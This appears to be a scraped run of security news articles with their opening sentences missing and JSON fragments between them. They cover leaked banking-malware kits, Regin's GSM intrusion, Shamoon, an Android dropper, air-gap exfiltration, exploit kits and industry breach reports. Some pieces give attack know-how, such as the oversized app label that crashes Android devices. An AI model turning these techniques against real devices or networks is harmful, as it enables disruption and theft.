According to the MalwareMustDie research group, which learned of the leaked files on June 26, the package includes the KINS 2.0.0.0 builder and the source code for the control panel. The package has been widely distributed on the Web, giving cybercriminals the means to generate new malware and control their botnets. Researchers have pointed out that the developers of the malware builder call the tool “KINS Builder.” However, the binaries generated by it actually appear to be versions of the banking malware called ZeusVM. The malware generated by the builder is completely different from previous KINS versions. Experts say this shows that KINS developers have integrated ZeusVM technology into their creation. One of the features borrowed by KINS from ZeusVM is the use of steganography, the practice of concealing a file or message within another file or message. In the case of KINS/ZeusVM, the malware’s configuration data is hidden in a .JPG image file. MalwareMustDie researchers are providing the KINS toolkit package through private channels to other experts and security firms that want to analyze the threat. In the meantime, the malware crusaders have teamed up with the French researcher known as Xylit0l and the Japanese researcher known as unixfreaxjp to prevent the toolkit from being distributed. They have managed to remove the package from several websites, but the files have been made available on too many sites. Experts believe that the leak will lead to more botnets powered by KINS/ZeusVM 2.0.0.0.  MalwareMustDie also revealed that it has spotted ads on cybercrime forums for version 3 of KINS. According to researchers, the malware has been sold for $5,000. MalwareMustDie has published videos, technical details, and code for the leaked KINS toolkit. *Updated. The original version of the story incorrectly stated that the source code for both the builder and the control panel was made available.

One of those layers gives attackers the means to penetrate and monitor GSM base station controllers.   GSM (Global System for Mobile Communications) is a widely used standard for mobile networks. As part of its investigation, Kaspersky Lab examined the activity log of a GSM base station controller and discovered that attackers were able to obtain credentials that would allow them to control GSM cells in the network of a large cellular operator.   This means the attackers could have had access to information about what calls are being processed by a particular cell, redirect those calls to other cells, activate neighbor cells and perform other offensive actions, the researchers found. According to Kaspersky Lab, no other attacks are known to have been capable of those types of operations.   \"The ability to penetrate and monitor GSM networks is perhaps the most unusual and interesting aspect of these operations,\" the Kaspersky Lab researchers note in a whitepaper describing the platform. \"In today’s world, we have become too dependent on mobile phone networks which rely on ancient communication protocols with little or no security available for the end user. Although all GSM networks have mechanisms embedded which allow entities such as law enforcement to track suspects, other parties can hijack this ability and abuse it to launch different attacks against mobile users.\"   Over the course of a single month in April 2008, the attackers collected administrative credentials that would allow them to manipulate a GSM network in a Middle Eastern country. Regin allowed the attackers to issue a number of commands on the base station controller, including: 'rxmop', which enables them to check the software version type; 'rxmsp' to list the current call forwarding settings of the Mobile Station; and 'rlstc' to stop cells in the GSM network.   \"In total, the log indicates that commands were executed on 136 different cells,\" according to Kaspersky Lab's Global Research and Analysis Team (GReAT). \"Some of the cell names include \"prn021a, gzn010a, wdk004, kbl027a, etc...\". The command log we obtained covers a period of about one month, from April 25, 2008 through May 27, 2008. It is unknown why the commands stopped in May 2008 though; perhaps the infection was removed or the attackers achieved their objective and moved on. Another explanation is that the attackers improved or changed the malware to stop saving logs locally and that's why only some older logs were discovered.\"   According to Kaspersky Lab, the attackers behind the platform have compromised computer networks in at least 14 countries around the world, including Iran, Russia and Germany.  More than half of the infections found by Symantec are in the Russian Federation (28 percent) and Saudi Arabia (24 percent). The primary victims uncovered so far include governments, financial institutions, telecom operators, research organizations, multinational political bodies and individuals involved in advanced mathematical/cryptographical research.   According to Symantec, 48 percent of the victims they observed were private individuals and small businesses. Twenty-eight percent were telecoms.   Researchers at Symantec say Regin has been active since at least 2008, with the earliest version the company is aware of being used between 2008 and 2011. A second version has been used from 2013 onwards, though it may have been used earlier. Both firms are still looking for the attack vector the hackers used initially to get in.   \"The exact method used for the initial compromise remains a mystery, although several theories exist, including use of man-in-the-middle attacks with browser zero-day exploits,\" according to Kaspersky Lab's whitepaper. \"For some of the victims we observed tools and modules designed for lateral movement.\" \"So far,\" the paper continues, \"we have not encountered any exploits. The replication modules are copied to remote computers using Windows administrative shares and then executed. Obviously this technique requires administrative privileges inside the victim’s network. In several cases the infected machines were also Windows domain controllers. Targeting of system administrators via web-based exploits is a simple way of achieving immediate administrative access to the entire network.\" " }

Despite this however, they are also areas where many organizations appear to be falling short.  In its latest Global Threat Intelligence Report (PDF), managed security services provider Solutionary says some of the biggest threats to security come from enterprises not doing the basics. \"In general, enterprises do have antivirus in place, but in many cases [it's] not appropriately maintained,\" said Rob Kraus, director of research with Solutionary’s Security Engineering Research Team (SERT). \"During many incident response engagements we supported last year, it was observed that organizations did not have properly maintained antivirus implementations. Detection rates for malware in general are very low (less than 50 percent), when basic controls such as AV are not deployed appropriately organizations have even lower detection capabilities.\" In fact, just 46 percent of malware caught by the company's honeypots was detected by popular antivirus products, according to the report. Exacerbating the situation further is the fact that when the malware from the honeypots was run in a proprietary sandbox masquerading as an infected host, the malware often downloaded additional applications dodged detection as well. Some of this malware is distributed by exploit kits. Most of the vulnerabilities targeted by these kits in 2013 were less than a year old, according to the report. The most prevalent vulnerabilities affected Oracle Java, with the most common being CVE-2012-1723. \"Organizations lacking mature VLM (vulnerability lifecycle management) programs are four times more susceptible to attacks via exploit kits,\" the report notes. \"Analysis of total vulnerabilities contained in exploit kits shows an organization without a VLM program generally has as many as four times as many exploitable vulnerabilities in its environment than an organization with a mature VLM program.\" While companies tend to exhibit strong security in regards to externally-facing systems, internal systems are often less secure, Solutionary found. The most common external vulnerability was an outdated Apache Tomcat server, which comprised 18 percent of all external vulnerabilities. The most common internal vulnerability was missing security updates for Microsoft Windows (6 percent of internal vulnerabilities). Another common internal issue was vulnerable versions of Adobe Reader (six percent).  \"One of the force multipliers for addressing patch management issues is the approach of root cause analysis,\" Kraus said. \"For instance, focusing on why the vulnerability exists in the first place and addressing it will help the overall strategy.\" \"Hardening systems to reduce the amount of open services on a system will also drastic reduce the exploitable footprint,\" he added. Meeting this challenge also requires organizations understand their inventory and have a process to ensure that updates for antivirus and other programs do not get missed. \"It’s always some group, some location, some set of systems somewhere that either got blocked from getting updates or just plain got missed,\" explained Don Gray, chief security strategist with Solutionary. \"We mention in the report (in the logging section) that often the security group doesn’t know about key pieces of infrastructure that are used to run the business.\" \"And that,\" he added, \"is why we talk about the 'lifecycle management of security controls'. You need to have an asset management system that can tie information together to be able to know that your controls are operating individually.\" " }

Threats designed to target devices running Mac OS X are increasingly common and increasingly successful. A perfect example is the recently-uncovered WireLurker malware which is believed to have infected hundreds of thousands of devices in China. Santa, named so because it \"keeps track of binaries that are naughty and nice,\" is just one of the many tools and scripts developed by Google's Macintosh Operations Team for managing and tracking a fleet of Mac computers in a corporate environment. The search engine company uses tens of thousands of Macs and managing them is not an easy task. Santa is not an official Google product and it's not even at version 1.0 due to some issues that still need to be addressed, but the project looks promising. The tool has four main components: a kernel extension for monitoring executions, a userland daemon that makes execution decisions based on the contents of a SQLite database, a graphical user interface (GUI) agent that notifies the user when an execution is blocked, and a command-line utility that's used to manage the system and synchronize the database with a server. The tool is designed to run in two modes: monitor and lockdown. In the \"monitor\" mode, all binaries are allowed to run, except for those that are blacklisted. In \"lockdown\" mode, only whitelisted binaries can be executed.  Users are given the possibility to blacklist or whitelist binaries based on the signing certificate, which allows them to block or trust all binaries from a certain publisher. Because whitelisted binaries are cached in the kernel, processing required to make a request is only carried out if the binary isn't cached already, Santa developers said. As a safety feature, the daemon, the GUI agent and the command-line utility check to ensure that their signing certificates are identical before accepting any communications. Because logging events is important in an enterprise environment, Santa is designed to log all executions processed by the userland agent. In addition, unknown and denied binaries are stored in the database. According to the project's developers, there is still a lot of work to be done and several issues to address, including kernel extension (kext) communication security, protection for the SQLite database, and completing the code for the management server synchronization.  Furthermore, the developers say no documentation has been written and not enough tests have been conducted. Santa has been released as open source and the project's developers say they welcome contributions from anyone. However, those who want to make changes to the tool are required to sign a contributor license agreement. " }

The slides, belonging to Canada's Communications Security Establishment (CSE), describe a campaign dubbed “Operation Snowglobe.” The document shows some of the tools used in the campaign and a list of targeted organizations. It also notes that the group behind the operation is likely backed by a French intelligence agency. Since the slides were published, several security firms obtained malware samples with capabilities and code similar to what CSE described in its document. Over the past months, experts at ESET, Cyphort and G DATA have published papers on Babar, EvilBunny (Bunny), and Casper. In addition, the list of malware families used by Animal Farm also includes NBot, Tafacalou (TFC / Transporter) and Dino. According to a report published today by ESET, Dino is a sophisticated backdoor that uses different modules to carry out its tasks. Its main goal appears to be the theft of files from infected systems. The sample analyzed by ESET was used in 2013 to target organizations in Iran. ESET researcher Joan Calvet, who has been analyzing the Animal Farm for several months, has pointed out in a blog post that the name Dino might be referring to the pet dinosaur from the animated television series “The Flintstones.” It’s worth noting that experts believe the name Babar might be inspired by a fictional elephant from a French children’s book, while the name Casper could stem from the animated cartoon series “Casper the Friendly Ghost.” The security firm says it hasn’t determined Dino’s initial infection vector, but it believes the threat is installed by another program. In a blog post on the Animal Farm APT published in March, Kaspersky Lab noted that Tafacalou acts as an entry point for the group’s more sophisticated spy platforms Babar and Dino. Once it infects a system, Dino can be commanded to retrieve system information from the infected machine, execute Windows batch commands, search for specific files, upload files to the command and control (C&C) server, and download files from the C&C. The malware operators can also schedule commands to be executed at a specified time, and they can uninstall the threat from the system by leaving only few traces of its existence. Experts have uncovered several pieces of shared code that show a clear connection between Dino and other threats from the Animal Farm malware families. In addition, Dino also provides more evidence that the developers of these malware families are French speakers. The language identifier present in more recent Animal Farm malware, such as the reconnaissance tool Casper, has been set to English. However, in the case of Dino, the value of the language code is 1036, which corresponds to French. It’s worth noting that the compiler automatically sets this identifier to the language of the developer’s machine unless a code is manually set. Calvet has pointed out that while it is possible that the French language code was set as a false flag, a more likely scenario is that the developers forgot to change the value of the language identifier when they created Dino. Another piece of evidence suggesting that Dino developers speak French is a file path that contains the word “arithmetique,” which is French for “arithmetic.” Researchers have highlighted that while Dino appears to have been created by professional and experienced developers, they haven’t put much effort into anti-analysis features, like the ones found in other Animal Farm threats such as Casper.

The security firm has published a report detailing Shamoon 2.0 and a new piece of malware, dubbed “StoneDrill,” that has been connected to both Shamoon and the Iran-linked threat actor Charming Kitten, aka NewsBeef and Newscaster. One of the most interesting pieces of information shared by the company about Shamoon 2.0 is that, in addition to its well-known wiper functionality, it includes a ransomware module. The ransomware functionality is currently inactive, but experts believe it could be leveraged in future Shamoon attacks. Once it infects a machine, Shamoon checks the system time to determine when to drop the main payload, which allows the attackers to either wipe or encrypt files and partitions. “In the ‘encryption/ransomware’ mode, a weak pseudo - random RC4 key is generated, which is further encrypted by the RSA public key and stored directly on the hard drive (at <\\Device\\Harddisk0\\Partition0>) starting at offset 0x201, right after the master boot record,” Kaspersky said in its report. The ransomware module can be used to encrypt Shamoon components, files stored in Windows folders (e.g. Desktop, Downloads, Documents, Pictures), NTFS master file table (MFT) data from all drives except the system drive, files in Windows system folders, and part of the FirmwareBootDevice partition. Shamoon is not the only wiper whose authors have recently decided to add ransomware functionality to their creation. Late last year, researchers reported that a variant of the KillDisk malware, which had been involved in the attacks on Ukraine’s energy sector, had been designed to encrypt files and hold them for ransom instead of deleting them. Kaspersky Lab also revealed that the resources used by Shamoon appear to have a Yemeni Arabic language ID. While this could indicate that the threat group behind Shamoon is located in Yemen, which would also have a good reason to target Saudi Arabia, it’s also possible that this is a false flag. Previously, researchers attributed the Shamoon attacks to Iran. " }

The threat was analyzed by experts at Zscaler and Securify after finding an app on Google Play named “Earn Real Money Gift Cards.” The application hides a variant of the Android banking trojan BankBot, whose source code was leaked online in late 2016. The developer of the app hiding BankBot also created another application present on Google Play, a game named “Bubble Shooter Wild Life.” This game actually works, but it also includes functionality that turns it into a malware downloader. The dropper appears to be under development, but an analysis of its code, which has been protected by its creator using the Allatori Obfuscator, shows that it first requests permission to draw over other apps. It then waits 20 minutes before initiating its malicious routines, which is likely how it managed to bypass Google’s Bouncer security system. The dropper then tricks the user into giving it accessibility permissions by displaying a fake Google Service alert. While victims believe they are enabling a “Google Service,” they are actually enabling accessibility features. Once this step has been completed, a fake Google service update window is displayed and an APK from the device’s memory card is installed in the background. The process that takes place in the background also involves enabling the Android option that allows installation of apps from unknown sources. The user does not need to perform any other actions after accessibility permissions are granted as everything else takes place automatically in the background. Researchers from both Zscaler and Securify believe this particular type of accessibility services abuse is unique to this piece of malware. Securify told SecurityWeek that this dropper is sold on dark web marketplaces to cybercriminals looking to deliver Android trojans such as Exo, Mazar and BankBot. Google has known about the malicious applications, which have a total of less than 5,000 downloads, for at least two days, but they have yet to be removed from Google Play. Malware that abuses Android accessibility services is not uncommon, but cybercriminals keep finding new ways to exploit the feature. A study conducted last year by enterprise mobile security firm Skycure revealed that a majority of Android devices are vulnerable to attacks that trick users into enabling accessibility features via clickjacking.

The malware, dubbed PowerHammer, is the work of researchers at the Ben-Gurion University of the Negev in Israel. The university has previously published research on jumping air gaps via magnetic fields, infrared cameras, router LEDs, scanners, HDD activity LEDs, USB devices, the noise emitted by hard drives and fans, and heat emissions. PowerHammer exfiltrates data from a compromised machine by regulating its power consumption, which can be controlled through the workload of the device’s CPU. Sensitive pieces of information, such as passwords and encryption keys, can be stolen one bit at a time by modulating changes in the current flow. Researchers have devised two versions of the PowerHammer attack: line level power-hammering and phase level power-hammering. In the line level variant, the attacker intercepts the bits of data exfiltrated by the malware by tapping the compromised computer’s power cable. In the phase level attack, the attacker collects the data from the main electrical service panel. The data can be harvested using a non-invasive tap that measures the emissions on power cables, and converting them to a binary form via demodulation and decoding. A computer’s CPU is a significant power consumer and its workload has a direct impact on power consumption and implicitly the flow of current in the device’s power cable. By overloading the CPU with calculations and stopping and starting the workload, it’s possible to generate a signal over the power lines at a specified frequency. In the case of PowerHammer, the attacker establishes two different frequencies – one representing a “0” bit and another frequency representing a “1” bit. During their experiments, researchers saw transfer rates of up to 1000 bits/sec for the line level power-hammering attack and 10 bits/sec for the phase level attack. The best transfer rates were achieved on a PC, followed by a server (which had lower bit rates and more errors), and IoT devices (bit rates of up to 20 bits/sec and error rates of up to 18%). While these can be significant transfer rates for exfiltrating small pieces of information such as passwords – obtaining one character from a string requires 8 bits to be transferred – reliable exfiltration requires more than just sending the raw data. Researchers created 44-bit data frames that, in addition to the actual data being exfiltrated, include a preamble that signals the start of the transmission and 8 bits of CRC code at the end of the frame for error detection. As for countermeasures, researchers say PowerHammer attacks can be prevented by monitoring power lines for the presence of covert communication channels, by using power line filters to limit the leakage of conduction and radiation noise, and by installing software-level jammers that execute random workloads on the system in order to cause interference in the data transmission process.

Known as ThreatData, the framework is composed of three primary parts: feeds, data storage and real-time response. Feeds collect information from a specific source, and are implemented through a light-weight interface. The data can be in nearly any format and is transformed by the feed into a simple schema Facebook calls ThreatDatum. Once the feed has transformed the raw data, it is fed into two of the social network's existing data repositories: Hive and Scuba. Hive is used to answer questions based on long-term data, such as whether or not the threat has been seen before, while Scuba focuses on answering questions about the present day. \"Given the pace of criminals today, one of the hard parts is actually keeping track of all the data related to malware, phishing, and other risks,\" blogged Mark Hammell, Internet threat researcher at Facebook. \"We wanted an easier way to organize our work and incorporate new threat information we receive so that we can do more to protect people.\" \"When we began sketching out a system to solve this problem, we encountered issues others have faced: every company or vendor uses their own data formats, a consistent vocabulary is rare, and each threat type can look very different from the next,\" he continued. \"With that in mind, we set about building what we now call ThreatData, a framework for importing information about badness on the Internet in arbitrary formats, storing it efficiently, and making it accessible for both real-time defensive systems and long-term analysis.\" To help, Facebook built a processor to examine ThreatDatum at the time of logging and act on new threats. For example, all malicious URLs collected from any feed are sent to the same blacklist used to protect people on Facebook.com. Additionally, \"interesting\" malware file hashing are automatically downloaded from known malware repositories, stored and sent for automated analysis, Hammell explained. As part of the ThreatData framework, the company is expanding its capabilities to \"decorate the data with additional context at logging time,\" the researcher blogged. \"For example, we add Autonomous System, ISP, and country-level geocoding on every malicious or victimized IP address logged to the repository. As a result, we can understand where threats are coming from, arranged by type of attack, time, and frequency.\" \"We're constantly finding new ways to improve and extend the ThreatData framework to encompass new threats and make smarter decisions with the ones we've already identified,\" he blogged.

The court order places the companies' assets under the control of a court-appointed receiver. According to complaints filed by the FTC, since at least 2012, the defendants used software designed to trick consumers into believing there were problems with their computers and then hit them with sales pitches for tech support products and services to fix their machines. As part of the legal maneuver, the state of Florida joined the FTC in filing two separate cases against companies who allegedly sold the bogus software and the telemarketers who sold the unnecessary tech support services. In the first case, the defendants selling software include PC Cleaner Inc.; Netcom3 Global Inc.; Netcom3 Inc., also doing business as Netcom3 Software Inc.; and Cashier Myricks, Jr. The telemarketing defendants include Inbound Call Experts LLC; Advanced Tech Supportco. LLC; PC Vitalware LLC; Super PC Support LLC; Robert D. Deignan; Paul M. Herdsman; and Justin M. Wright.

According to the FTC, the scams began with computer software that claimed to improve the security or performance of the customer's computer. Typically, consumers downloaded a free, trial version of the software that would run a computer system scan. The scan always identified numerous errors, whether they existed or not. Consumers were then told that in order to fix the problems they had to purchase the paid version of the software for between $29 and $49. In order to activate the software after the purchase, consumers were then directed to call a toll-free number and connected to telemarketers who tried to sell them unneeded computer repair services and software, according to the FTC complaint. The services could cost as much as $500, the FTC stated. \"These operations prey on consumers’ lack of technical knowledge with deceptive pitches and high-pressure tactics to sell useless software and services to the tune of millions of dollars,\" said Jessica Rich, director of the FTC’s Bureau of Consumer Protection, in a statement. \"There’s no excuse for it, and we are pleased the court has taken steps to temporarily shut down these scams while our lawsuit proceeds.\" " }

Pbot can generate 75 Gbps from just 400 nodes and Mirai has been commoditized. However, despite the growing number of attacks, the overall trend seems to be for more frequent, smaller attacks. These are the primary takeaways from a new Q2 study into internet traffic. Akamai Technologies, a Cambridge, Mass.-based content delivery network (CDN) and cloud services provider with more than 233,000 servers in over 130 countries, has published its Q2 State of the Internet report (PDF). The report comprises analyses of attack data seen across this network. It shows that DDoS attacks have increased by a massive 28% over the previous quarter. Within this statistic, infrastructure layer (layers 3 and 4) attacks have risen by 27%; reflection-based attacks have risen 21%; and the average number of attacks per target has increased by 28%. Gaming sites are frequent targets, accounting for 81% of all volumetric DDoS attacks monitored by Akamai. While the average number of attacks per target rose to 32 over the period, one gaming site suffered 558 attacks, averaging six per day throughout the period. The final months of 2016 were notable for the largest DDoS attacks ever seen; but the current trend, suggests the report, is for smaller attacks. This is despite the continued availability of the Mirai botnet, and the use of Pbot malware to create mini-DDoS botnets able to generate a 75 Gbps attack from just 400 bots. Pbot's power comes from infecting webservers able to create more traffic per node than, say, Mirai's infection of large numbers of small IoT devices. \"We know that massive DDoS attacks are possible,\" says the report, \"but could this be a new trend going forward? Have DDoS attackers taken to more subtle, targeted attacks to avoid drawing attention?\" This possibility is given extra weight by the evolving nature of Mirai attacks. Akamai was one of the first Mirai targets in Fall 2016, and has continued to be a target. This long-standing adversarial relationship has allowed Akamai to study Mirai in some depth.  Mirai is often thought of as a single massive network of bots. In reality, says Akamai, \"it is more akin to smaller hives of related bots and C&Cs.\" An analysis of different Mirai C&Cs shows that parts of Mirai are used to attack different targets, with some C&Cs attacking multiple targets, and others attacking a single target. \"At least one botnet operator was offering access to the systems under its control for rent,\" notes Akamai, \"which may explain why some botnets attacked such a large number of IP addresses.\" Akamai says it will continue its research into and analysis of Mirai, but for now notes that it appears to be contributing to the commoditization of DDoS. The large number of different attacks emanating from single C&Cs can be considered as 'pay-for-play' attacks -- they were seen attacking IPs for a short duration, going inactive, and then re-emerging to attack different targets. The report also notes that DNS traffic analysis can be used to passively locate the likely incidence of malware infections. Ever since Conficker, malware has been using domain generation algorithms (DGAs) to hide their C&C infrastructure. These DGAs generate many pseudo-random IP addresses every day. The attacker needs to choose only one of the expected domains and register it 'just in time', and then abandon it after use. The malware, however, doesn't know which is the correct IP to contact, and cycles through the possibilities until it finds the right one. Akamai analyzed the traffic of more than 2.5 million connected networks. One hundred and forty were known to be infected with malware. \"When looking at the average number of unique domains accessed per hour,\" notes the study, \"we saw that infected networks had approximately 15 times the lookup rate of a clean network.\" This is explained by the malware trying to access the DGA-generated IPs. \"Since most of the generated domains were not registered, trying to access all of them created a lot of noise.\" DNS monitoring is thus a potential method of breach detection. \"Security defenders are advised to make certain they are using a combination of security monitoring products that include DNS monitoring,\" concludes Akamai. \"Having visibility into different areas of the enterprise network will increase detection and reduce risks. For the best defense, security controls should also be in place on endpoint devices and the inner network, not just Internet connectivity.\" " }

According to Trend Micro, most of the infections during the past three months occurred in the United States (66.82 percent), Chile (9.1 percent), Malaysia (3.32 percent), Norway (2.09 percent) and France (1.71 percent). The malware, which became active a few years ago, uses steganography techniques to hide its components in .PNG files. The technique has also been used by threats such as the Neverquest Trojan. In the case of Stegoloader, the PNG image and the decrypted code are not saved to the disk, and the malware’s main module exists in a memory area allocated specifically for this purpose. \"There have been recent successful breaches exposing millions of customer files of healthcare organizations like Anthem and Premera Blue Cross,\" blogged Homer Pacag, threat response engineer at Trend Micro. \"Although yet to be seen in attacks, steganography can potentially be a new technique cybercriminals looking to perform healthcare attacks can use to expose medical records in the future.\" According to Trend Micro, the technique of embedding malicious code in image files to evade detection will continue to gain popularity among attackers, and the reemergence of the Trojan and its focus on certain regions and industries shows cybercriminals are continually experimenting with different uses of steganography for spreading threats. \"When we first blogged about the malware in January 2014, the TROJ_GATAK.FCK variant was bundled with key generators for various applications and FAKEAV is its final payload,\" Pacag noted. \"The final payload for the three recent samples of the malware, TROJ_GATAK.SMJV, TROJ_GATAK.SMN, and TROJ_GATAK.SMP are under analysis.\" \"Note that the routines from variants of past years remain the same,\" the researcher continued. \"The malware is downloaded from the Internet by users who believe it to be key generators or keygens. Once downloaded, it poses as a legitimate file related to Skype or Google Talk. It eventually downloads the stock photo where a huge part of its routines is embedded.

The vulnerability was publicly disclosed earlier this month by researcher Ibrahim Balic, which he referred to as a memory corruption bug. According to Balic, the bug can be triggered if the application's 'appname' field has a value greater than 387,000 characters. In addition, the situation also caused a denial-of-service condition on Google Play after Balic uploaded his malformed APK as a test.  \"We believe this vulnerability may be used by cybercriminals to do some substantial damage on Android smartphones and tablets,\" blogged Trend Micro Mobile Threats Analyst Veo Zhang. \"The device is stuck in an endless reboot loop, or a bootloop. This can render the device unusable, which some may consider \"bricking\" it.\" The issue appears to affect Android OS versions 4.0 and higher. Trend Micro's analysis shows the first crash is caused by the memory corruption in WindowManager, the interface that applications use to control the placement and appearance of windows on a given screen. Large amounts of data were entered into the Activity label, which is the equivalent of the window title in Windows, Zhang blogged. \"If a cybercriminal builds an app containing a hidden Activity with a large label, the user will have no idea whatsoever that this exploit is in fact taking place,\" Zhang explained. \"Cybercriminals can further conceal the exploit by setting a timed trigger event that stops the current app activity and then opens the hidden Activity. When the timed event is triggered, the exploit runs, and the system server crashes as a result. This stops all functionality of the mobile device, and the system will be forced to reboot.\" \"An even worse case is when the malware is written to start automatically upon device startup,\" Zhang continued. \"Doing so will trap the device in a rebooting loop, rendering it useless. In this case, only a boot loader recovery fix will work, which means that all the information (contacts, photos, files, etc.) stored inside the device will be erased.\" Additional research by Trend Micro has uncovered another issue apart from the WindowManager service. According to Trend Micro, PackageManager and ActivityManager are also susceptible to a similar situation. The difference is that the user's device will crash immediately when the malicious app is installed. \"In AndroidManifest.xml, apps’ label names can be set in the “android:label” attribute of the element, and it can be written with a raw string, not only with the reference of the string resource,\" Zhang blogged. \"Normally, apps with very long raw string labels declared in AndroidManifest.xml cannot be installed, due to the Android Binder’s transaction buffer size limit. But through the ADB (Android Debug Bridge) interface, which is used by many third-party market clients, such apps can be installed–which, inevitably, causes an instant PackageManager service crash.\" The result is a chain reaction in which all other processes depending upon PackageManager will crash as well, leaving the device unusable.  \"As always, we advise users to never download apps from third-party app stores,\" the Trend Micro researcher explained. \"It’s important to treat third-party apps with a healthy dose of suspicion and skepticism as cybercriminals are always on the lookout to find and exploit every nook and cranny in Android devices. Google has already been notified about the vulnerabilities but users should still take the necessary precautions in order to protect their mobile devices. Developers familiar with the use of the Android Debug Bridge can use this as well to remove problematic apps in question.\" Google was notified of the vulnerabilities. So far, it has not responded to a request for comment.  " }

Utilizing unknown malware, the actor remained under the radar by imitating another attack group in the region, which also made attribution difficult, especially given recent examples of false flags being planted to send investigators down the wrong tracks. While the initial attacks look as the work of the unsophisticated Gaza Cybergang (decoys, file names), deeper analysis revealed a different picture, Kaspersky says. The attacks, which Kaspersky refers to as Operation Parliament, were clearly centered on espionage, hitting top legislative, executive and judicial bodies. Since early 2017, the attackers targeted numerous organizations worldwide, but focused mainly on the Middle East and North Africa (MENA) region, especially Palestine. Supposedly connected to incidents Cisco Talos detailed earlier this year, the assaults targeted high-profile entities such as parliaments, senates, top state offices and officials, political science scholars, military and intelligence agencies, ministries, media outlets, research centers, election commissions, Olympic organizations, large trading companies, and other unknown entities. Kaspersky believes the attacks are the work of “a previously unknown geopolitically motivated threat actor” doing “just enough to achieve their goals.” The attackers supposedly have access to additional tools when needed and also use “an elaborate database of contacts in sensitive organizations and personnel worldwide, especially of vulnerable and non-trained staff.” Compromised systems range from “personal desktop or laptop systems to large servers with domain controller roles or similar.” They belong to ministries responsible for telecommunications, health, energy, justice, finance, and other areas. Victims were located in the Palestinian Territories, Egypt, Jordan, the UAE, Saudi Arabia, Djibouti, Qatar, Lebanon, Chile, Somalia, Iraq, Morocco, Syria, India, Iran, Canada, the USA, the UK, Germany, Israel, Afghanistan, Serbia, Russia, Oman, Kuwait, South Korea and Denmark. The attackers have carefully verified victim devices before infecting them and also safeguarded their command and control (C&C) servers. The attacks slowed down since the beginning of this year, likely “winding down when the desired data or access was obtained,” Kaspersky notes. “The targeting of specific victims is unlike previously seen behavior in regional campaigns by Gaza Cybergang or Desert Falcons and points to an elaborate information-gathering exercise that was carried out before the attacks (physical and/or digital),” the researchers point out. Packed with VMProtect, the employed malware didn’t reveal similarities with previously known malicious programs. Encryption and obfuscation were applied to all strings and settings, while communication with the C&C server was achieved via HTTP. Data sent to the C&C is encrypted and the malware uses different keys for local and network encryption. The malware initiates communications by sending basic information about the infected machine and the server responds with the encrypted serialized configuration. The malware provides a remote CMD/PowerShell terminal for the attackers, which allows them to execute scripts and commands on the compromised machines, and to receive the results via HTTP requests. Kaspersky would not provide full details on the attacks and the used malware, but points out that high-profile organizations should have advanced protections in place, given that attacks against them “are inevitable and are unlikely to ever cease.” “These organizations need to pay particular attention to their security, implementing additional measures to ensure they are well protected. Anti-targeted attack solutions, threat intelligence capabilities and data flows, default-deny application lockdown, endpoint detection and response, data leak and insider threat prevention, and even isolated/air-gapped networks should form the basis of any strategy for protecting organizations in the current threat landscape,” Kaspersky concludes.

Neptune, whose arrival was detailed by researchers in January, is also known as Terror, Blaze and Eris. It was initially considered a variant of the Sundown exploit kit due to many code similarities. Exploit kit activity has been declining since the disappearance of Angler and Neutrino. Sundown also went silent and the infosec community managed to delivered a significant blow to the infrastructure used by RIG. Neptune has gained popularity and it continues to be used in malvertising campaigns, particularly ones that aim to deliver cryptocurrency miners. Several changes have been spotted recently by FireEye in Neptune attacks, including URI patterns, landing pages, malvertising campaigns and payloads. The new URI patterns were first observed by FireEye in mid-July. The attackers have been abusing a legitimate pop-up ad service (present in Alexa’s Top 100) to deliver malware via fake advertisements for hiking clubs. The malicious websites imitate real domains, often using the same domain name with a .club suffix instead of .com (e.g. highspirittreks.com vs highspirittreks.club). One of the domains used to redirect users to the exploit kit landing pages also mimics a YouTube to MP3 online converter. The ads linked to this Neptune exploit kit campaign have been typically served on popular torrent and hosting websites. Once victims are taken to the landing page, the EK exploits three Internet Explorer and two Adobe Flash Player vulnerabilities to deliver malware. None of the exploits used by Neptune are new – they target vulnerabilities disclosed between 2014 and 2016. The payload delivered in the campaign is a piece of malware that mines for Monero (XMR), a cryptocurrency currently worth roughly $86 per unit. The regions most affected by the campaign are South Korea (29%), Europe (19%), Thailand (13%), Middle East (13%) and the United States (10%). “Despite an observable decline in exploit kit activity, users are still at risk, especially if they have outdated or unpatched software,” FireEye warned. “This threat is especially dangerous considering drive-by exploit kits (such as Neptune EK) can use malvertisements to seamlessly download payloads without ever alerting the user.” " }

The 11th edition of the DBIR is based on data provided to Verizon by 67 organizations, and it covers more than 53,000 incidents and over 2,200 breaches across 65 countries. According to Verizon, ransomware was found in 39% of cases involving malware. Experts believe ransomware has become so prevalent due to the fact that it’s easy to deploy — even for less skilled cybercriminals — and the risks and costs associated with conducting an operation are relatively small for the attacker. Cybercriminals have increasingly started using ransomware to target mission-critical systems, such as file servers and databases, which causes more damage to the targeted organization compared to only desktop systems getting compromised.  By targeting a larger number of devices and more important systems within an organization, attackers can demand bigger ransoms. “What is interesting to us is that businesses are still not investing in appropriate security strategies to combat ransomware, meaning they end up with no option but to pay the ransom – the cybercriminal is the only winner here!” explained Bryan Sartin, executive director of security professional services at Verizon. “As an industry, we have to help our customers take a more proactive approach to their security. Helping them to understand the threats they face is the first step to putting in place solutions to protect themselves.” According to the latest DBIR, financially-motivated attacks remain the most common and accounted for 76% of breaches analyzed in 2017. Cyber espionage is the second most common type of attack, accounting for 13% of breaches. Nearly three-quarters of attacks were conducted by outsiders, half of which were organized crime groups, and 12% were state-sponsored threat actors. Almost half of the attacks analyzed by Verizon involved hacking and 30% relied on malware. One in five incidents involved mistakes made by employees, including misconfigured web servers, emails sent to the wrong person, and failure to shred confidential documents. While 78% of employees did not click on any phishing links, 4% will fall for any given campaign. This is a small percentage, but one victim is enough for an attacker to gain access to an organization’s systems, Verizon warned. The telecoms giant also revealed that the number of incidents involving pretexting has increased more than five times since the previous DBIR. Of the 170 incidents analyzed in 2017, 88 targeted HR staff with the goal of obtaining personal data that could be used to file fraudulent tax returns. Both an executive summary and the full report are available directly from Verizon in PDF format — no registration is required. " }

